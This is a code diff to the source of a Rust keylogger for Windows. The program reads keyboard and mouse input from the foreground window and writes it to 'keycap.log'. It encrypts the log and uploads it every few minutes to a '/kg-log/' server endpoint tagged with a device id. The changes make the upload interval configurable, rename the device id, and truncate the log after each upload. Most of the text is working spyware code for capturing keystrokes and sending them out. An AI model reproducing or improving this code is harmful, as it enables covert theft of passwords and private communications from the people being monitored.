@@ -1,4 +1,4 @@
-use std::fs::{OpenOptions, metadata, read_to_string, remove_file};
+use std::fs::{OpenOptions, metadata, read_to_string};
 use std::thread;
 use std::time::Duration;
 use chrono::prelude::*;
@@ -15,6 +15,7 @@ use crypt::cryption::encrypt_string;
 
 const LOGGER: &str = "keycap.log";
 const BASE_URL: &str = "http://127.0.0.1:5000";
+const N_SECONDS: u64 = 300;
 
 macro_rules! error {
     ($msg:expr, $($arg:expr), *) => {
@@ -368,15 +369,6 @@ async fn keylog() {
     unsafe{
 
         loop{
-            let mut file = {
-                match OpenOptions::new().write(true).create(true).open(&filename){
-                    Ok(file) => {file}
-                    Err(e) => {
-                        error!("Coudlnt create Output file: {}",e);
-                        std::process::exit(0);
-                    }
-                }
-            };
             sleep(Duration::from_millis(10));
             // To recieve keyboard and mouse input 
             let hwnd = winapi::um::winuser::GetForegroundWindow();
@@ -477,7 +469,7 @@ async fn uplink() -> Result<(), Error> {
 
     let response = client.post(format!("{BASE_URL}/kg-log/"))
     .json(&json!({
-        "device_id": "EID-01",
+        "device_id": "VICKY",
         "log": encrypt_string(logs),
     }))
     .send()
@@ -485,8 +477,15 @@ async fn uplink() -> Result<(), Error> {
 
     match response.status() {
         StatusCode::OK => {
-            // There is no need to check the existence of the LOGGER file since this function wouldn't run without the LOGGER file.
-            let _ = remove_file(LOGGER);
+            let _log_file = {
+                match OpenOptions::new().write(true).create(true).truncate(true).open(&LOGGER){
+                    Ok(file) => {file}
+                    Err(e) => {
+                        error!("Coudlnt create Output file: {}",e);
+                        std::process::exit(0);
+                    }
+                }
+            };
         },
         _ => {}
     }
@@ -494,10 +493,10 @@ async fn uplink() -> Result<(), Error> {
     Ok(())
 }
 
-async fn runs_every_5_mins_once() {
+async fn runs_every_n_mins_once() {
 
     loop{
-        sleep(Duration::from_secs(300));
+        sleep(Duration::from_secs(N_SECONDS));
 
         if logger_file_exists() && can_establish_connection().await {
             if let Err(_e) = uplink().await {};
@@ -513,7 +512,7 @@ async fn main() {
     }
 
     let logger_handler = spawn(keylog());
-    let uplink_handler = spawn(runs_every_5_mins_once());
+    let uplink_handler = spawn(runs_every_n_mins_once());
 
     let _ = join!(logger_handler, uplink_handler);
 }
